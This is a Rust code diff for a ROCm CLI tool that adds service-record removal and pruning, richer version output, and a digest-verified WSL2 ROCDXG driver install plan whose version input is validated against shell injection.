@@ -57,7 +57,7 @@ use rocm_engine_protocol::{
 };
 use serde::de::DeserializeOwned;
 use serde::{Deserialize, Serialize};
-use std::collections::{BTreeMap, VecDeque};
+use std::collections::{BTreeMap, HashMap, VecDeque};
 use std::ffi::OsString;
 use std::fmt::Write as _;
 use std::fs;
@@ -70,7 +70,7 @@ use std::process::ExitStatus;
 use std::process::{Command as ProcessCommand, Stdio};
 use std::sync::{Mutex, OnceLock};
 use std::thread;
-use std::time::Duration;
+use std::time::{Duration, SystemTime};
 
 static BUILTIN_ENGINE_ENV_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
 
@@ -176,7 +176,8 @@ enum Command {
         #[arg(long)]
         device_index: Option<i64>,
     },
-    /// Print the rocm-cli version.
+    /// Print the rocm-cli version, release tag or branch, and commit hash,
+    /// plus the ROCm SDK and GPU driver this machine would use.
     Version,
     /// Generate a shell completion script for the given shell.
     Completions {
@@ -876,6 +877,46 @@ enum ServicesCommand {
         #[arg(long)]
         yes: bool,
     },
+    /// Delete one local server record and its files.
+    ///
+    /// Only works on a record that is not running: stop the server first. The
+    /// record's details file, log, engine state file, and endpoint key file are
+    /// all deleted, so its log can no longer be read and it can no longer be
+    /// restarted.
+    Remove {
+        /// Service id from `rocm services list --all`.
+        service_id: String,
+        /// Do not ask for confirmation.
+        #[arg(long)]
+        yes: bool,
+    },
+    /// Delete local server records that are no longer running.
+    ///
+    /// Running servers are always left alone. Leftover files whose record is
+    /// already gone are cleaned up too.
+    Prune {
+        /// Only remove records and files untouched for at least this many hours.
+        ///
+        /// Age is measured from when the record file was last written — a stop,
+        /// a restart, or a status correction all count as touching it — so a
+        /// server that has only just stopped keeps its log and stays
+        /// restartable. Pass 0 to include everything that is not running.
+        #[arg(long, default_value_t = DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS)]
+        older_than_hours: u64,
+        /// Remove every record that is not running, however recent.
+        ///
+        /// The same thing as `--older-than-hours 0`, named so it can be reached
+        /// without knowing the age rule exists -- which is how most people will
+        /// arrive here, after the summary tells them recent records were kept.
+        #[arg(long, conflicts_with = "older_than_hours")]
+        any_age: bool,
+        /// Show what would be removed, without removing anything.
+        #[arg(long)]
+        dry_run: bool,
+        /// Do not ask for confirmation.
+        #[arg(long)]
+        yes: bool,
+    },
 }
 
 #[derive(Subcommand, Debug)]
@@ -1302,7 +1343,8 @@ fn run() -> Result<()> {
 }
 
 /// Build the root `rocm` command with its top-level subcommands ordered
-/// alphabetically in `--help` output (EAI-7362).
+/// alphabetically in `--help` output (EAI-7362), and `-V`/`--version` reporting
+/// the same traceable string as `rocm version` (see [`cli_version_string`]).
 ///
 /// clap assigns each subcommand an incrementing display order in declaration
 /// order and renders the command list sorted by `(display_order, name)`.
@@ -1314,14 +1356,23 @@ fn run() -> Result<()> {
 /// subcommand *after* this runs and leaves it at that default, so matching the
 /// default here lets `help` sort into its alphabetical position instead of being
 /// pinned last. The regression test guards this if clap's default ever changes.
+///
+/// `display_name` only changes what `-V`/`--version` prints ahead of the
+/// version string — verified against `--help`'s `Usage:` line and `completions`
+/// output, both of which are generated from `Cli::command()` directly and so
+/// bypass this override.
 fn cli_command() -> clap::Command {
-    Cli::command().mut_subcommands(|sc| sc.display_order(999usize))
+    Cli::command()
+        .mut_subcommands(|sc| sc.display_order(999usize))
+        .version(cli_version_string())
+        .display_name("rocm-cli")
 }
 
 /// Parse process arguments through [`cli_command`] so `rocm --help` and
-/// `rocm help` list subcommands alphabetically. Mirrors the derived
-/// `Cli::parse()`, which builds from `Cli::command()` directly and therefore
-/// cannot pick up the reordering.
+/// `rocm help` list subcommands alphabetically and `rocm -V`/`--version` print
+/// the traceable version string. Mirrors the derived `Cli::parse()`, which
+/// builds from `Cli::command()` directly and therefore cannot pick up either
+/// override.
 ///
 /// Returns a [`ClapExitCode`]-carrying error instead of calling
 /// `clap::Error::exit()` directly, so `run()`'s caller can unwrap the code
@@ -1332,6 +1383,60 @@ fn cli_command() -> clap::Command {
 fn parse_cli() -> Result<Cli> {
     let matches = cli_command().try_get_matches().map_err(clap_exit_code)?;
     Cli::from_arg_matches(&matches).map_err(clap_exit_code)
+}
+
+/// What every version-reporting surface (`-V`/`--version`, `rocm version`, and
+/// the MCP in-process handler) prints: the semantic version Cargo built, plus
+/// the git ref and commit hash [`build.rs`] embedded, additively — never a
+/// replacement, so a build with an "unknown" ref (no tag, no branch, no git)
+/// still reports a real version number rather than none at all.
+fn cli_version_string() -> String {
+    format!(
+        "{} ({}, {})",
+        env!("CARGO_PKG_VERSION"),
+        env!("ROCM_CLI_VERSION_REF"),
+        env!("ROCM_CLI_GIT_HASH")
+    )
+}
+
+/// `rocm version`: the traceable build string, plus the ROCm SDK and GPU
+/// driver this machine would actually use -- unlike `-V`/`--version` and the
+/// MCP fast path, which stay a single terse line for scripts and in-process
+/// callers.
+///
+/// "The ROCm SDK" prefers the active managed TheRock runtime (what `rocm`
+/// itself runs engines against), falling back to a detected but unmanaged
+/// system ROCm install -- the same precedence `rocm`'s freeform "ROCm status"
+/// answer already uses, just without its other, heavier probing.
+fn version() -> Result<()> {
+    println!("rocm-cli {}", cli_version_string());
+
+    let paths = AppPaths::discover()?;
+    let config = RocmCliConfig::load(&paths).unwrap_or_default();
+    let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+    match current_runtime_manifest(&config, &manifests) {
+        Some(manifest) => println!(
+            "ROCm SDK: {} ({})",
+            therock::runtime_version_display(&manifest.version),
+            manifest.install_root.display()
+        ),
+        None => match rocm_core::detect_legacy_rocm_sdk() {
+            Some((version, path)) => {
+                println!(
+                    "ROCm SDK: {version} (unmanaged install at {})",
+                    path.display()
+                );
+            }
+            None => println!("ROCm SDK: not detected"),
+        },
+    }
+
+    match rocm_core::detect_gpu_driver_version() {
+        Some(version) => println!("GPU driver: {version}"),
+        None => println!("GPU driver: not detected"),
+    }
+
+    Ok(())
 }
 
 /// Legacy `uv` cache location, used before the cache was colocated with the managed
@@ -1931,10 +2036,7 @@ fn dispatch(cli: Cli) -> Result<()> {
             dry_run,
             device_index,
         }) => fix(fix_id, yes, dry_run, device_index),
-        Some(Command::Version) => {
-            println!("rocm {}", env!("CARGO_PKG_VERSION"));
-            Ok(())
-        }
+        Some(Command::Version) => version(),
         Some(Command::Setup { command }) => setup(command),
         Some(Command::EngineServeHttp {
             engine,
@@ -2396,6 +2498,9 @@ fn strip_subcommands(cmd: clap::Command) -> clap::Command {
     if let Some(long_version) = cmd.get_long_version() {
         bare = bare.long_version(long_version.to_owned());
     }
+    if let Some(display_name) = cmd.get_display_name() {
+        bare = bare.display_name(display_name.to_owned());
+    }
     for alias in cmd.get_visible_aliases() {
         bare = bare.visible_alias(alias.to_owned());
     }
@@ -2516,6 +2621,11 @@ struct ExamineJsonSummary<'a> {
     active_runtime_id: Option<&'a str>,
     active_runtime_key: Option<&'a str>,
     previous_runtime_key: Option<&'a str>,
+    /// Where the active runtime lives, completing the `id`/`key`/`root` triple.
+    /// Not derivable from the key: `install_root` is its own field on the
+    /// manifest, and `install sdk --prefix`, `runtimes adopt` and `runtimes
+    /// import` all set it freely.
+    active_runtime_root: Option<String>,
 }
 
 fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
@@ -2538,6 +2648,12 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
         // in a loop.
         let host = ExamineSummary::gather()?;
         let configured_default_engine = config.default_engine.as_deref();
+        // Same resolution the human report uses, minus the recovery write above:
+        // an unreadable registry leaves the root `null` rather than failing the
+        // inspection, which is the weaker answer but still an answer.
+        let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+        let active_runtime_root = current_runtime_manifest(&config, &manifests)
+            .map(|manifest| manifest.install_root.display().to_string());
         let document = ExamineJson {
             examination: &examination,
             summary: ExamineJsonSummary {
@@ -2546,6 +2662,7 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
                 active_runtime_id: config.default_runtime_id.as_deref(),
                 active_runtime_key: config.active_runtime_key.as_deref(),
                 previous_runtime_key: config.previous_runtime_key.as_deref(),
+                active_runtime_root,
                 host: &host,
             },
         };
@@ -2970,7 +3087,7 @@ fn install_driver(
         pre_driver: examine.driver,
         post_driver: None,
         boot_id_at_execution: boot_id,
-        reboot_required: false,
+        reboot_required: plan.reboot_required,
         reboot_observed: false,
         commands: plan.execution_commands(),
         reconciled_at_unix_ms: None,
@@ -2979,36 +3096,54 @@ fn install_driver(
     write_driver_install_state(paths, &state)
         .map_err(|source| DriverInstallError::new(source, false))?;
 
-    for command in &plan.commands {
-        if !matches!(
-            command.phase,
-            DriverCommandPhase::Prepare | DriverCommandPhase::Execute
-        ) {
-            continue;
-        }
-        run_driver_shell_command(&command.command)
-            .with_context(|| format!("driver command failed: {}", command.command))
-            .map_err(|source| DriverInstallError::new(source, true))?;
-    }
-
-    let post_driver = ExamineSummary::gather()
-        .map_err(|source| DriverInstallError::new(source, true))?
-        .driver;
-    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
-    state.post_driver = Some(post_driver);
-    state.reboot_required = true;
-    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
-    write_driver_install_state(paths, &state)
-        .map_err(|source| DriverInstallError::new(source, true))?;
+    execute_driver_install_plan(
+        &plan,
+        &mut state,
+        run_driver_shell_command,
+        |state| write_driver_install_state(paths, state),
+        || ExamineSummary::gather().map(|summary| summary.driver),
+    )
+    .map_err(|source| DriverInstallError::new(source, true))?;
 
     let report = cli_report::ActionReport::new("driver install completed")
-        .detail("reboot_required", true)
+        .detail("reboot_required", plan.reboot_required)
         .detail("state", driver_install_state_path(paths).display());
     output.push_str(&report.render());
     Ok(DriverInstallResult {
         output,
         executed: true,
     })
+}
+
+fn execute_driver_install_plan<Run, Persist, Gather>(
+    plan: &DriverInstallPlan,
+    state: &mut DriverInstallState,
+    mut run: Run,
+    mut persist: Persist,
+    gather_post_driver: Gather,
+) -> Result<()>
+where
+    Run: FnMut(&str) -> Result<()>,
+    Persist: FnMut(&DriverInstallState) -> Result<()>,
+    Gather: FnOnce() -> Result<rocm_core::DriverSummary>,
+{
+    for command in &plan.commands {
+        if plan.reboot_required && command.phase == DriverCommandPhase::Verify {
+            continue;
+        }
+        run(&command.command)
+            .with_context(|| format!("driver command failed: {}", command.command))?;
+    }
+
+    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
+    state.reboot_required = plan.reboot_required;
+    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
+    persist(state)?;
+
+    let post_driver = gather_post_driver()?;
+    state.post_driver = Some(post_driver);
+    persist(state)?;
+    Ok(())
 }
 
 fn reconcile_driver_install(paths: &AppPaths) -> Result<String> {
@@ -3047,7 +3182,6 @@ fn reconcile_driver_install_state(
         .zip(current_boot_id.as_deref())
         .is_some_and(|(executed, current)| executed != current);
     state.reboot_observed = reboot_observed;
-    state.reboot_required = state.reboot_required || state.executed_at_unix_ms.is_some();
     state.post_driver = Some(driver.clone());
     let at_unix_ms = rocm_core::unix_time_millis();
     state.reconciled_at_unix_ms = Some(at_unix_ms);
@@ -3230,6 +3364,13 @@ struct DriverInstallPlan {
     preflight_checks: Vec<String>,
     commands: Vec<DriverPlanCommand>,
     checks: Vec<String>,
+    /// Whether the host must reboot before the verification steps mean anything.
+    ///
+    /// True for the kernel-module paths: an amdgpu DKMS build is not live until
+    /// the machine comes back up. False on WSL2, where nothing kernel-side
+    /// changes — ROCDXG is a userspace library and `ldconfig` publishes it
+    /// immediately, so telling the user to reboot would be wrong.
+    reboot_required: bool,
 }
 
 impl DriverInstallPlan {
@@ -3352,6 +3493,343 @@ struct DriverPassiveCheck {
     detail: String,
 }
 
+/// Release of ROCDXG installed on WSL2, overridable for trying another build.
+///
+/// Resolved once at plan-build time via [`resolve_shell_default_template`], the
+/// same way `ROCM_CLI_AMDGPU_VERSION` is handled for the bare-metal repository
+/// pin. The concrete value is baked into the archive name, the release URL and
+/// the `repo_version:` line, so the plan a user reviews names the build the
+/// install will actually fetch rather than an unexpanded `${...}` placeholder.
+///
+/// How the default is chosen: the newest non-prerelease `librocdxg` release
+/// whose `rocdxg-roct` digest is pinned in [`ROCDXG_PINNED_DIGESTS`]. Moving it
+/// is two edits — add the `(version, digest)` row to that table, then change
+/// the literal here — and the two must move together: a default with no row
+/// makes [`resolve_rocdxg_verification`] refuse to build a plan at all unless
+/// the caller supplies a digest, so a bump that forgets the table breaks every
+/// default WSL install rather than falling back to the previous release.
+///
+/// Deliberately out of scope: `rocdxg-amd-smi-lib_<version>_amd64.deb`, which
+/// v1.2.1 and v1.2.2 ship alongside `rocdxg-roct` and the five releases before
+/// them do not, is not installed here. It is a second prefix under
+/// `/opt/rocm-wsl` carrying its own `amd-smi` and `libamd_smi.so`, and it
+/// installs an `/etc/profile.d` entry that sources the package's own
+/// `/opt/rocm-wsl/.env.sh`, which in turn prepends that prefix to `PATH` and
+/// `LD_LIBRARY_PATH` for new login shells. That is a system-wide environment
+/// change in service of a monitoring utility that neither `wsl_rocdxg_ready`
+/// nor `rocm serve` depends on, and it is not available for every version in
+/// the pinned table. Installing it is a separate decision that belongs behind
+/// its own opt-in, not folded into the plan whose job is to supply the runtime
+/// bridge.
+const ROCDXG_VERSION_EXPR: &str = "${ROCM_CLI_ROCDXG_VERSION:-1.2.2}";
+
+/// Supplies a SHA-256 digest for the ROCDXG package, overriding the pinned one.
+/// Required when installing a version this build has no digest for.
+const ROCDXG_SHA256_ENV: &str = "ROCM_CLI_ROCDXG_SHA256";
+
+/// Opts out of digest verification entirely, when set to an affirmative value.
+/// Named explicitly so that shipping an unverified root install is a deliberate
+/// act with an audit trail in the plan, rather than what happens when a variable
+/// is simply unset.
+const ROCDXG_ALLOW_UNVERIFIED_ENV: &str = "ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED";
+
+/// SHA-256 digests of the `rocdxg-roct` package shipped with each published
+/// ROCDXG release, taken from the release host's own asset metadata.
+///
+/// These exist so the default install is authenticated. The package is fetched
+/// over plain HTTPS from a release page and then handed to `apt-get install`,
+/// which runs its maintainer scripts as root — so without a digest, TLS to the
+/// download host is the only thing standing between a compromised or swapped
+/// artifact and root on the user's machine. That is materially weaker than the
+/// bare-metal apt path in this same file, which installs from a repository
+/// pinned with `signed-by=/etc/apt/keyrings/rocm.gpg`.
+///
+/// A version absent from this table is not installed unless the caller supplies
+/// a digest via `ROCM_CLI_ROCDXG_SHA256` or opts out via
+/// `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`; see [`resolve_rocdxg_verification`].
+/// Add the new pair here when pinning a newer release. Nothing in the tree
+/// checks a row against the published artifact, so a mistyped digest surfaces
+/// only as a failed install on a WSL host — fail-closed, but confusing. Take
+/// the value from the release's own asset metadata, or recompute it:
+///
+/// ```text
+/// curl -L --fail \
+///   https://github.com/ROCm/librocdxg/releases/download/v<version>/rocdxg-roct_<version>_amd64.deb \
+///   | sha256sum
+/// ```
+const ROCDXG_PINNED_DIGESTS: &[(&str, &str)] = &[
+    (
+        "1.0.0",
+        "5e78d300dfb8c10dfd57de24b312ff9f9962a3a971f571e5e9383e1c543b607a",
+    ),
+    (
+        "1.1.0",
+        "d1f92415d218ca10df3c39f2ce48872ee968549a97191e987f2c2a79ab709f23",
+    ),
+    (
+        "1.1.1",
+        "cd2ba9dbfd32bf35755a45e7e92410524f32baa2b4dcc31d0106876d04c3abcc",
+    ),
+    (
+        "1.1.2",
+        "e426a5f58f4f177512a354ed5f0dd7b2c0a2b736f009e09bf806edf18ca6cb97",
+    ),
+    (
+        "1.2.0",
+        "3ed9526719290cd8f590150dad8ea0f234fa779bea6a4c9a8449d7ae6b8cfb6e",
+    ),
+    (
+        "1.2.1",
+        "7889eef45a1132ed2dde88d8ea1356bf791ec9c05802a18940bc81b970e850e0",
+    ),
+    (
+        "1.2.2",
+        "28ded1254811192ebace1f76c0227580184af7b27ab2475fb9728295a702d541",
+    ),
+];
+
+/// Whether a resolved ROCDXG version is safe to place in the plan's commands.
+///
+/// The driver plan is a list of shell lines run through `sh -c`, and the
+/// version is interpolated into three of them — the archive name, the release
+/// URL and the local path — each of which is then executed with `sudo` already
+/// primed by an earlier `apt-get update`. `ROCM_CLI_ROCDXG_VERSION` reaches
+/// this unchanged from the environment, so a value containing `;` or a
+/// backtick would otherwise end the intended command and start an attacker's
+/// own. Restricting it to characters that appear in a Debian package version
+/// removes the possibility rather than trying to escape it.
+fn rocdxg_version_is_well_formed(version: &str) -> bool {
+    !version.is_empty()
+        && version.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && version
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-' | '~'))
+}
+
+/// Whether a string is a bare lowercase 64-character hex SHA-256 digest, the
+/// form `sha256sum -c -` expects.
+fn sha256_digest_is_well_formed(digest: &str) -> bool {
+    digest.len() == 64 && digest.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+/// How the downloaded ROCDXG package will be authenticated before it is
+/// installed as root.
+#[derive(Debug, Clone, Eq, PartialEq)]
+enum RocdxgVerification {
+    /// Check the download against this digest and abort the install on a
+    /// mismatch.
+    Digest(String),
+    /// Install without checking, because the caller explicitly asked for it.
+    OptedOut,
+}
+
+/// Decide how a ROCDXG download will be authenticated, or `Err` with the reason
+/// no plan can be built.
+///
+/// Resolution order — an explicit digest wins over the pinned one so a user can
+/// install an artifact this build predates without having to disable
+/// verification wholesale:
+///
+/// 1. `ROCM_CLI_ROCDXG_SHA256`, when it is a well-formed digest.
+/// 2. The digest pinned for this version in [`ROCDXG_PINNED_DIGESTS`].
+/// 3. `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`, when set to an affirmative value
+///    — see [`crate::therock::truthy_env`] for the exact allowlist — which opts
+///    out. `0` and `false` do not.
+///
+/// Nothing left means refusal. Verification is therefore opt-*out*: the failure
+/// mode of an unset variable is a plan that will not run, not a root install of
+/// an unauthenticated package.
+fn resolve_rocdxg_verification(version: &str) -> Result<RocdxgVerification, String> {
+    if let Some(supplied) = std::env::var(ROCDXG_SHA256_ENV)
+        .ok()
+        .map(|value| value.trim().to_ascii_lowercase())
+        .filter(|value| !value.is_empty())
+    {
+        if !sha256_digest_is_well_formed(&supplied) {
+            return Err(format!(
+                "{ROCDXG_SHA256_ENV} is not a 64-character hex SHA-256 digest; refusing to install ROCDXG without a usable digest."
+            ));
+        }
+        return Ok(RocdxgVerification::Digest(supplied));
+    }
+
+    if let Some(pinned) = ROCDXG_PINNED_DIGESTS
+        .iter()
+        .find_map(|(pinned_version, digest)| (*pinned_version == version).then_some(*digest))
+    {
+        return Ok(RocdxgVerification::Digest(pinned.to_owned()));
+    }
+
+    // An allowlist of affirmative values, not "set to anything non-empty":
+    // otherwise `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED=0` — which every reader takes
+    // for "off" — would turn digest checking off for a package installed as
+    // root. Anything this does not recognise leaves verification on.
+    if crate::therock::truthy_env(ROCDXG_ALLOW_UNVERIFIED_ENV) {
+        return Ok(RocdxgVerification::OptedOut);
+    }
+
+    Err(format!(
+        "no known SHA-256 digest for ROCDXG {version}, and this package is installed as root. Set {ROCDXG_SHA256_ENV} to the digest published with that release, or set {ROCDXG_ALLOW_UNVERIFIED_ENV}=1 to install without verifying it."
+    ))
+}
+
+/// A WSL plan that cannot be run, carrying the reason in the same shape every
+/// other unsupported plan uses so `--dry-run`, the approval prompt and
+/// `state.json` all report it identically.
+fn wsl_rocdxg_refusal_plan(repo_version: String, reason: String) -> DriverInstallPlan {
+    DriverInstallPlan {
+        supported: false,
+        mutating: false,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version,
+        reason,
+        preflight_checks: Vec::new(),
+        commands: Vec::new(),
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        reboot_required: false,
+    }
+}
+
+/// The `rocm install driver` plan for a WSL2 host.
+///
+/// WSL2 has no in-tree amdgpu driver to install: the GPU comes from the Windows
+/// host driver through `/dev/dxg`, and what ROCm needs on the Linux side is
+/// ROCDXG (`librocdxg`), which bridges the runtime to it. Without that library
+/// `rocm examine` reports `wsl_rocdxg_missing` and `rocm serve` refuses with
+/// "no usable AMD GPU detected", even though a gfx target is detected — the
+/// target is read from the Windows-side driver.
+///
+/// This used to be a refusal pointing at a shell script under `scripts/`, which
+/// ships only in a git checkout — never in the release bundle — so it was a dead
+/// end for anyone who installed the CLI normally. These are that script's steps;
+/// it has been removed rather than left as a second, untested copy of them.
+fn wsl_rocdxg_driver_plan(escalation: PrivilegeEscalation) -> DriverInstallPlan {
+    let version = resolve_shell_default_template(ROCDXG_VERSION_EXPR);
+    if !rocdxg_version_is_well_formed(&version) {
+        return wsl_rocdxg_refusal_plan(
+            // The rejected value is still rendered into the plan's
+            // `repo_version:` line so the user can see what was refused — but
+            // that line is part of a plan a human reads to decide, and a raw
+            // value containing a newline could forge further lines in it. The
+            // debug form escapes newlines and makes trailing space visible,
+            // which is exactly what is wanted for a value being shown as
+            // rejected.
+            format!("{version:?}"),
+            "ROCM_CLI_ROCDXG_VERSION is not a well-formed package version. It is interpolated into privileged shell commands, so only letters, digits, and `. + - ~` are accepted.".to_owned(),
+        );
+    }
+    let verification = match resolve_rocdxg_verification(&version) {
+        Ok(verification) => verification,
+        Err(reason) => return wsl_rocdxg_refusal_plan(version, reason),
+    };
+
+    let sudo = escalation.prefix();
+    let deb = format!("rocdxg-roct_{version}_amd64.deb");
+    let url = format!("https://github.com/ROCm/librocdxg/releases/download/v{version}/{deb}");
+    let deb_path = format!("/tmp/{deb}");
+    // `version` is validated above and the digest is hex, so neither can carry
+    // shell metacharacters; the quotes keep that guarantee local to the command
+    // rather than resting on a check several functions away.
+    let verify_download = match &verification {
+        RocdxgVerification::Digest(digest) => driver_command(
+            DriverCommandPhase::Execute,
+            &format!("printf '%s  %s\\n' '{digest}' '{deb_path}' | sha256sum -c -"),
+        ),
+        RocdxgVerification::OptedOut => driver_command(
+            DriverCommandPhase::Execute,
+            &format!(
+                "echo 'warning: installing ROCDXG {version} without verifying it ({ROCDXG_ALLOW_UNVERIFIED_ENV} is set)' >&2"
+            ),
+        ),
+    };
+    DriverInstallPlan {
+        supported: true,
+        mutating: true,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version: version,
+        reason:
+            "WSL2 uses the Windows host driver plus ROCDXG, not Linux DKMS; this installs ROCDXG."
+                .to_owned(),
+        // Read, not run: the GPU plumbing belongs to the WSL platform, so if it
+        // is absent the fix is on the Windows side and no Linux package helps.
+        // The Execute phase fails on the same two paths rather than installing
+        // a library with nothing to bind to.
+        preflight_checks: {
+            let mut checks = vec![
+                "/dev/dxg (WSL GPU device)".to_owned(),
+                "/usr/lib/wsl/lib/libdxcore.so (WSL dxcore runtime)".to_owned(),
+            ];
+            checks.extend(driver_root_preflight_checks(escalation));
+            checks
+        },
+        commands: vec![
+            driver_command(
+                DriverCommandPhase::Prepare,
+                "test -e /dev/dxg || { echo 'error: /dev/dxg is missing; WSL GPU plumbing is not available' >&2; exit 1; }",
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                "test -e /usr/lib/wsl/lib/libdxcore.so || { echo 'error: /usr/lib/wsl/lib/libdxcore.so is missing' >&2; exit 1; }",
+            ),
+            // Say why up front rather than letting the first privileged step die
+            // with `sudo: command not found`, which reads like a broken plan.
+            // Skipped when already root: the plan emits no `sudo` at all then,
+            // so demanding the binary would state a precondition it is not
+            // relying on.
+            driver_command(
+                DriverCommandPhase::Prepare,
+                if escalation.needs_sudo_binary() {
+                    "command -v sudo >/dev/null 2>&1 || { echo 'error: sudo is required to install ROCDXG under /opt/rocm' >&2; exit 1; }"
+                } else {
+                    "test \"$(id -u)\" -eq 0 || { echo 'error: this plan was built to run as root' >&2; exit 1; }"
+                },
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get update"),
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get install -y ca-certificates curl"),
+            ),
+            driver_command(
+                DriverCommandPhase::Execute,
+                &format!("curl -L --fail --show-error --output '{deb_path}' '{url}'"),
+            ),
+            // Authenticating the download is the whole trust anchor for this
+            // plan: everything after it runs the package's maintainer scripts
+            // as root. `sha256sum -c -` exits non-zero on a mismatch, which
+            // aborts the plan before the install step.
+            verify_download,
+            driver_command(
+                DriverCommandPhase::Execute,
+                &format!("{sudo}apt-get install -y '{deb_path}'"),
+            ),
+            driver_command(DriverCommandPhase::Execute, &format!("{sudo}ldconfig")),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "test -e /opt/rocm/lib/librocdxg.so",
+            ),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "ldconfig -p | grep -q 'librocdxg\\.so'",
+            ),
+        ],
+        // `rocm diagnose` carries the WSL catalog, including the host-side
+        // form that inspects a distro over `wsl.exe` without needing anything
+        // installed inside it.
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        // Userspace only: `ldconfig` publishes the library in this boot.
+        reboot_required: false,
+    }
+}
+
 fn build_driver_install_plan(
     examine: &ExamineSummary,
     os_release_text: &str,
@@ -3382,25 +3860,11 @@ fn build_driver_install_plan(
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            reboot_required: true,
         };
     }
     if examine.wsl.as_ref().is_some_and(|wsl| wsl.is_wsl) {
-        return DriverInstallPlan {
-            supported: false,
-            mutating: false,
-            policy: "wsl_rocdxg".to_owned(),
-            os_id: "wsl".to_owned(),
-            version_id: String::new(),
-            codename: String::new(),
-            repo_version,
-            reason: "WSL uses the Windows host driver plus ROCDXG; run `scripts/wsl_setup_rocdxg.sh` inside WSL instead of installing Linux DKMS.".to_owned(),
-            preflight_checks: Vec::new(),
-            commands: Vec::new(),
-            // `rocm diagnose` carries the WSL catalog, including the host-side
-            // form that inspects a distro over `wsl.exe` without needing anything
-            // installed inside it.
-            checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
-        };
+        return wsl_rocdxg_driver_plan(escalation);
     }
 
     let os_id = parse_os_release_field(os_release_text, "ID").unwrap_or_default();
@@ -3506,6 +3970,8 @@ fn build_driver_install_plan(
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            // Kernel module: not live until the machine comes back up.
+            reboot_required: true,
         }),
     }
 }
@@ -3724,6 +4190,8 @@ fn apt_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -3827,6 +4295,8 @@ fn dnf_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -3924,6 +4394,8 @@ fn sles_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -4091,14 +4563,23 @@ fn render_driver_install_plan(plan: &DriverInstallPlan, yes: bool, dry_run: bool
         .iter()
         .filter(|command| command.phase == DriverCommandPhase::Verify)
         .collect::<Vec<_>>();
+    // A plan that changes nothing kernel-side is live as soon as it finishes, so
+    // labelling its checks "post_reboot" would tell the user to reboot for
+    // nothing — and would contradict the `reboot_required: false` this same plan
+    // reports after executing.
+    let checks_label = if plan.reboot_required {
+        "post_reboot"
+    } else {
+        "post_install"
+    };
     if !verification_commands.is_empty() {
-        let _ = writeln!(output, "  post_reboot_check_commands:");
+        let _ = writeln!(output, "  {checks_label}_check_commands:");
         for command in verification_commands {
             let _ = writeln!(output, "    {}", command.command);
         }
     }
     if !plan.checks.is_empty() {
-        let _ = writeln!(output, "  post_reboot_checks:");
+        let _ = writeln!(output, "  {checks_label}_checks:");
         for check in &plan.checks {
             let _ = writeln!(output, "    {check}");
         }
@@ -7121,6 +7602,57 @@ fn services(command: Option<ServicesCommand>) -> Result<()> {
         ServicesCommand::Restart { service_id, yes } => {
             run_approved_service_action(&paths, "restart_server", &service_id, yes)
         }
+        ServicesCommand::Remove { service_id, yes } => {
+            print!(
+                "{}",
+                remove_managed_service_record(&paths, &service_id, yes)?
+            );
+            record_cli_audit_event(
+                &paths,
+                "service",
+                "remove_record",
+                "info",
+                format!("removed local server record {service_id}"),
+                Some(&service_id),
+            );
+            Ok(())
+        }
+        ServicesCommand::Prune {
+            older_than_hours,
+            any_age,
+            dry_run,
+            yes,
+        } => {
+            let older_than_hours = service_prune_min_age_hours(older_than_hours, any_age);
+            let outcome = prune_managed_service_records(&paths, older_than_hours, dry_run, yes)?;
+            print!("{}", outcome.text);
+            if !dry_run && (outcome.removed_records > 0 || outcome.removed_files > 0) {
+                record_cli_audit_event(
+                    &paths,
+                    "service",
+                    "prune_records",
+                    "info",
+                    format!(
+                        "removed {} local server record(s) and {} leftover file(s) older than {older_than_hours}h",
+                        outcome.removed_records, outcome.removed_files
+                    ),
+                    None,
+                );
+            }
+            // Deliberately after the print and the audit event: a file this run
+            // could not delete still has to fail the command, but not at the
+            // cost of the record of what it *did* delete.
+            if !outcome.failures.is_empty() {
+                // Only reachable through this dispatch, so no unit test covers
+                // it: `service-cleanup-06` in
+                // `features/service_record_cleanup.feature` is its cover.
+                bail!(
+                    "{} file(s) could not be removed; see the list above",
+                    outcome.failures.len()
+                );
+            }
+            Ok(())
+        }
